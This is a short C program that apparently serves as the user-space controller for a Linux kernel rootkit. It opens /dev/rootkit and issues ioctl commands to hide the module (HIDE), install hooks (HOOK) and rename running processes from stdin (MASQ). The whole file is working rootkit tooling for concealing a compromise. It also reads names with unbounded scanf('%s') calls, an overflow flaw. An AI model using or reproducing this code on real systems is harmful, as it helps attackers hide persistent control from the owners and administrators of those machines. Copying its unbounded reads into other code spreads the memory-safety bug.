#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include "rootkit.h"

int main (int argc, char *argv[]) {
    int fd = open("/dev/rootkit", O_RDWR);
    long i;
    struct masq_proc_req masq_req;

    if (fd == -1) {
        fprintf(stderr, "Open rootkit fail!\n");
        return -1;
    }
    if (argc != 2) {
        fprintf(stderr, "Wrong number of arguments!\n");
        return -1;
    }

    if (!strcmp(argv[1], "HIDE")) {
        ioctl(fd, IOCTL_MOD_HIDE);
    }
    else if (!strcmp(argv[1], "HOOK")) {
        ioctl(fd, IOCTL_MOD_HOOK);
    }
    else if (!strcmp(argv[1], "MASQ")) {
        scanf("%ld", &(masq_req.len));
        masq_req.list = malloc(sizeof(struct masq_proc) * masq_req.len);
        if (masq_req.list == NULL) {
            fprintf(stderr, "malloc fail!\n");
            return -1;
        }
        for (i = 0; i < masq_req.len; ++i)
            scanf("%s %s", masq_req.list[i].orig_name, masq_req.list[i].new_name);
        ioctl(fd, IOCTL_MOD_MASQ, &masq_req);
    }
    else {
        fprintf(stderr, "Unknown operation.\n");
        return -1;
    }
    return 0;
}
